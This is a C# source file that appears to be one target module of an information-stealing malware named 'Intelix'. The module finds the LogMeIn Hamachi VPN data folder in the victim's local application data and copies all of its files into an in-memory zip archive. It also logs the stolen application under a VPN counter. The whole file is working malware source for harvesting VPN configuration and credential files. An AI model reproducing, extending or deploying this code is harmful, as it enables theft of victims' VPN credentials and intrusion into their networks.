using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class Hamachi : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "LogMeIn Hamachi");
		if (Directory.Exists(text))
		{
			string text2 = "LogMeIn Hamachi";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "LogMeIn Hamachi";
			zip.AddDirectoryFiles(text, text2);
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Vpns.Add(counterApplications);
		}
	}
}
